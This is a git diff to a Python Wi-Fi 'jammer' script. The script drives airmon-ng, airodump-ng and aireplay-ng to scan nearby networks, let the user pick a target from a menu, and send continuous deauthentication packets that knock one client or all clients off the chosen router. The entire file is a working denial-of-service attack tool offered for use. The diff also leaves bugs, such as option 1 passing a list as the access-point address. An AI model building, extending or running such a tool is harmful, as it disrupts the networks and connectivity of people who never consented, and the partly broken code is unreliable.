@@ -4,7 +4,15 @@ import os
 import sys
 import subprocess
 import time
-import webbrowser
+import questionary
+import csv
+
+custom_style = questionary.Style([
+    ("qmark", "fg:#00ff00 bold"),     # green question mark
+    ("selected", "fg:#00ff00 bold"),  # green selected choice
+    ("pointer", "fg:#ff5f00 bold"),   # orange pointer
+])
+
 
 RED = '\033[91m'
 GREEN = '\033[92m'
@@ -78,7 +86,7 @@ class jammer():
             elif "arch" in distro or "manjaro" in distro :
                 subprocess.run(['sudo', 'pacman', '-S', 'aircrack-ng','--noconfirm'], check=True)
             else:
-                print("Please install ADB manually.")
+                print("Please install aircrack-ng manually.")
         except:
             print(f"{RED}Error installing aircrack-ng try to install manually ...{END}")
             sys.exit(1) 
@@ -106,23 +114,45 @@ class jammer():
         subprocess.check_call(['airmon-ng','check','kill'],stdout=subprocess.PIPE,text=True)
         subprocess.check_call(['iwconfig'])
         try:
-            self.wireless_interface = input(f"{YELLOW}Enter Your wifi card interface name : {END}").strip()
-            self.clear()   
-            print(f"{YELLOW}Entering monitor mode ....{END}")
-            time.sleep(1)
-            subprocess.run(['airmon-ng','start',self.wireless_interface],stdout=subprocess.PIPE,text=True)
-            self.clear()    
+            result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            # Process the output to get the interface names
+            # self.interface_names = []
+            self.wireless_interface_mon = None
+            for line in result.stdout.splitlines():
+                if 'IEEE 802.11' in line:
+                    interface_name = line.split()[0]
+                    self.interface_names = interface_name
+                    if 'Mode:Monitor' in line:
+                        self.wireless_interface_mon = interface_name
         except :
             print(f"{RED}Invalid wifi card name or you pressed ctrl + c...{END}")
             print("TRY AGAIN..")
             sys.exit(1)
-            print(f"{GREEN}Killing some unwanted backgroud processes...{END}")
+        print(f"{GREEN}Killing some unwanted backgroud processes...{END}")
         subprocess.check_call(['airmon-ng','check','kill'],stdout=subprocess.PIPE,text=True)
         time.sleep(1)  
-        subprocess.check_call(['iwconfig'])   
-        time.sleep(1)
-        self.wireless_interface_mon = input(f"{RED}Enter Your new wifi card interface name : {END}").strip()
+        subprocess.run(['airmon-ng','start',interface_name],stdout=subprocess.PIPE,text=True)
         self.clear()
+
+    def retrive_info(self, index):
+
+        self.essid = []
+        self.bssid = []
+        self.channel = []
+        with open("dump-01.csv", mode='r') as file:
+            reader = csv.reader(file)
+            for row in reader:
+                if len(row) > 13:
+                    var = row[index]  
+                    if index == 0:   #index 0 is bssid
+                        if var.strip():
+                            self.bssid.append(var)
+                    elif index == 3:  #insex 3 is channel
+                        if var.strip():
+                            self.channel.append(var)
+                    elif index == 13:  #index 13 is essid
+                        if var.strip():
+                            self.essid.append(var)
     def wifi_dump(self):
         
         print(f"{YELLOW}Dumping the wifi traffic Press ctrl + c to stop... !!{END}")
@@ -130,8 +160,12 @@ class jammer():
         self.clear()
         
         try :
-            
-            process = subprocess.Popen(['airodump-ng','-w','dump','--output-format','csv', self.wireless_interface_mon])
+            if not self.wireless_interface_mon:
+                self.wireless_interface_mon = self.interface_names + "mon"
+            os.system('clear')
+            if os.path.exists('dump-01.csv'):
+                os.remove('dump-01.csv')
+            process = subprocess.Popen(['airodump-ng', '--output-format', 'csv', '--write', 'dump', self.wireless_interface_mon])
 
             #works as a delay or simply waits infinity long to get interrupt ctrl + c from user
             while True:
@@ -140,6 +174,7 @@ class jammer():
                     process.wait()
                 except KeyboardInterrupt:
                     print("\nStopping the Wi-Fi dump...")
+                    self.retrive_info(13)
                     process.terminate()  # Terminate the process
                     process.wait()       # Wait for the process to exit
                     break
@@ -162,39 +197,44 @@ class jammer():
         self.specific_dump()
         self.type_of_attack()
 
-    def specific_dump(self) :
-        self.bssid = input(f"{RED}Enter the BSSID : {END}").strip()
-        self.channel = input(f"{RED}Enter the channel: {END}").strip()
-        print(f"{YELLOW}Dumping the target network traffic...{END}")
-        time.sleep(1)
-        try :
-            process = subprocess.Popen(['airodump-ng','--bssid',self.bssid,'-c',self.channel,self.wireless_interface_mon])
-
-            while True:
-                try:
-                    process.wait()
-                except KeyboardInterrupt:
-                    print(f"{RED}Stopping the dump...{END}")
-                    process.terminate()
-                    process.wait()
-                    break
-        finally:
-            pass
-
     def type_of_attack(self):
- 
-        print(f"{GREEN}Enter the attack type: (1, 2, or 3){END}")
-        options = input(f"{GREEN}1. Specify the client and send deauth packets to that client\n{END}"
-                        f"{RED}2. Send deauth packets to the whole Wi-Fi (knock all clients off the router)\n{END}"
-                        f"{YELLOW}3. Exit\nEnter: {END}").strip()
+        self.retrive_info(13)
+        print(self.essid)
+        
+        options = questionary.select(
+            "Enter the BSSID type:",
+            choices=self.essid,
+            style=custom_style
+        ).ask()
+        
+        index = self.essid.index(options)
+        print(index)
+        self.retrive_info(0)
+        print(self.bssid)
+        current_bssid = self.bssid[index]
+        print(current_bssid)
+        self.retrive_info(3)
+        current_channel = self.channel[index]
+        print(current_channel)
+        subprocess.run(['iwconfig', self.wireless_interface_mon, 'channel', current_channel])
+    
+        options = questionary.select(
+            "Enter the attack type:",
+            choices=[f"1. Specify the client and send deauth packets to that client\n", f"2. Send deauth packets to the whole Wi-Fi (knock all clients off the router)\n", f"3. Exit\nEnter: "],
+            style=custom_style
+        ).ask()
+        if "." in options:
+            option = options.split(".")[0]
+            print(option)
+    
         try:
-            match options:
+            match option:
                     case "1":
                         station = input(f"{YELLOW}Enter the client's station address (near the targeted BSSID: {self.bssid}): {END}").strip()
                         process = subprocess.Popen(['aireplay-ng', self.wireless_interface_mon, '--deauth', '0', '-a', self.bssid, '-c', station])
                         process.wait()  # Wait for the process to finish
                     case "2":
-                        process = subprocess.Popen(['aireplay-ng', self.wireless_interface_mon, '--deauth', '0', '-a', self.bssid])
+                        process = subprocess.Popen(['aireplay-ng', self.wireless_interface_mon, '--deauth', '0', '-a', current_bssid])
                         process.wait()
                     case "3":
                         print(f"{RED}Exiting...{END}")
@@ -216,5 +256,5 @@ class jammer():
 wifi = jammer() 
 wifi.interface_name()
 wifi.wifi_dump()
-wifi.specific_dump()
+# wifi.specific_dump()
 wifi.type_of_attack()
